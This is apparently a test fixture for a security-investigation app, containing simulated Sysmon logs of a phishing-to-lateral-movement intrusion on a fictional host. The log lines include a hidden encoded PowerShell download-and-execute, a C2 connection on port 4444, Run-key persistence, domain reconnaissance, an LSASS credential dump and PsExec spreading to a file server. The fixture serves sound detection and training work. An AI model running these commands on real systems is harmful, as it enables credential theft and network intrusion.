// TEST FIXTURE (not used by the running app): a Sysmon (Winlogbeat-style
// JSON) trace of a phishing macro → encoded PowerShell → C2 → persistence →
// LSASS dump → PsExec lateral movement, with benign browser noise mixed in.
// Fictional hosts/users; 185.220.101.5 sits in a public Tor exit range.

export const SAMPLE_INVESTIGATION = {
  title: "Suspicious PowerShell from Word on WS-FIN-042",
  alertDetails:
    "EDR alert: winword.exe spawned cmd.exe → powershell.exe with an encoded command on WS-FIN-042 (user jdoe), followed by an outbound connection on tcp/4444.",
  fileName: "ws-fin-042-sysmon.json",
  logs: `[
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:00:02.114",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\explorer.exe",
    "ProcessId": "3120",
    "ParentImage": "C:\\\\Windows\\\\System32\\\\userinit.exe",
    "ParentProcessId": "2984",
    "CommandLine": "C:\\\\Windows\\\\Explorer.EXE",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:00:41.502",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\OUTLOOK.EXE",
    "ProcessId": "4012",
    "ParentImage": "C:\\\\Windows\\\\explorer.exe",
    "ParentProcessId": "3120",
    "CommandLine": "\\"OUTLOOK.EXE\\"",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:01:23.877",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
    "ProcessId": "4388",
    "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\OUTLOOK.EXE",
    "ParentProcessId": "4012",
    "CommandLine": "\\"WINWORD.EXE\\" /n \\"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\Q3K2\\\\Invoice_10442.docm\\"",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:01:30.240",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
    "ProcessId": "4470",
    "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
    "ParentProcessId": "4388",
    "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:01:31.006",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ProcessId": "4512",
    "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
    "ParentProcessId": "4470",
    "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "User": "ACME\\\\jdoe",
    "Hashes": "SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3"
  },
  {
    "EventID": 22,
    "UtcTime": "2026-10-20 08:01:32.418",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ProcessId": "4512",
    "QueryName": "cdn-update-check.xyz",
    "QueryResults": "185.220.101.5"
  },
  {
    "EventID": 3,
    "UtcTime": "2026-10-20 08:01:34.090",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ProcessId": "4512",
    "User": "ACME\\\\jdoe",
    "SourceIp": "10.20.4.42",
    "DestinationIp": "185.220.101.5",
    "DestinationPort": "4444",
    "Protocol": "tcp"
  },
  {
    "EventID": 11,
    "UtcTime": "2026-10-20 08:01:39.731",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ProcessId": "4512",
    "TargetFilename": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "Hashes": "SHA256=5F2B7F2E9A4F61C1C7A5B2E1D3C9D7E2A6B4F8C0D1E2F3A4B5C6D7E8F9A0B1C2"
  },
  {
    "EventID": 13,
    "UtcTime": "2026-10-20 08:01:41.115",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ProcessId": "4512",
    "TargetObject": "HKU\\\\S-1-5-21-1004\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\MSUpdater",
    "Details": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:01:44.302",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ProcessId": "5120",
    "ParentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "ParentProcessId": "4512",
    "CommandLine": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe -s",
    "User": "ACME\\\\jdoe",
    "Hashes": "SHA256=5F2B7F2E9A4F61C1C7A5B2E1D3C9D7E2A6B4F8C0D1E2F3A4B5C6D7E8F9A0B1C2"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:02:10.556",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\whoami.exe",
    "ProcessId": "5188",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "whoami /all",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:02:14.903",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\net.exe",
    "ProcessId": "5204",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "net group \\"Domain Admins\\" /domain",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:02:19.477",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\ipconfig.exe",
    "ProcessId": "5236",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "ipconfig /all",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:02:24.080",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Windows\\\\System32\\\\nltest.exe",
    "ProcessId": "5260",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "nltest /dclist:acme.local",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:03:51.662",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\pd64.exe",
    "ProcessId": "5402",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "pd64.exe -accepteula -ma lsass.exe C:\\\\Users\\\\Public\\\\lsass.dmp",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 10,
    "UtcTime": "2026-10-20 08:03:52.004",
    "Computer": "WS-FIN-042.acme.local",
    "SourceImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\pd64.exe",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\pd64.exe",
    "ProcessId": "5402",
    "TargetImage": "C:\\\\Windows\\\\System32\\\\lsass.exe",
    "GrantedAccess": "0x1fffff"
  },
  {
    "EventID": 11,
    "UtcTime": "2026-10-20 08:03:58.310",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\pd64.exe",
    "ProcessId": "5402",
    "TargetFilename": "C:\\\\Users\\\\Public\\\\lsass.dmp"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:05:12.845",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\PsExec64.exe",
    "ProcessId": "5530",
    "ParentImage": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\updater.exe",
    "ParentProcessId": "5120",
    "CommandLine": "PsExec64.exe \\\\\\\\FS-01 -accepteula -s cmd.exe /c \\"C:\\\\Windows\\\\Temp\\\\updater.exe\\"",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 3,
    "UtcTime": "2026-10-20 08:05:13.390",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\PsExec64.exe",
    "ProcessId": "5530",
    "User": "ACME\\\\jdoe",
    "SourceIp": "10.20.4.42",
    "DestinationIp": "10.20.1.15",
    "DestinationPort": "445",
    "Protocol": "tcp"
  },
  {
    "EventID": 1,
    "UtcTime": "2026-10-20 08:06:40.002",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",
    "ProcessId": "6010",
    "ParentImage": "C:\\\\Windows\\\\explorer.exe",
    "ParentProcessId": "3120",
    "CommandLine": "\\"chrome.exe\\"",
    "User": "ACME\\\\jdoe"
  },
  {
    "EventID": 3,
    "UtcTime": "2026-10-20 08:06:41.177",
    "Computer": "WS-FIN-042.acme.local",
    "Image": "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",
    "ProcessId": "6010",
    "User": "ACME\\\\jdoe",
    "SourceIp": "10.20.4.42",
    "DestinationIp": "142.250.72.14",
    "DestinationPort": "443",
    "Protocol": "tcp"
  }
]`,
};
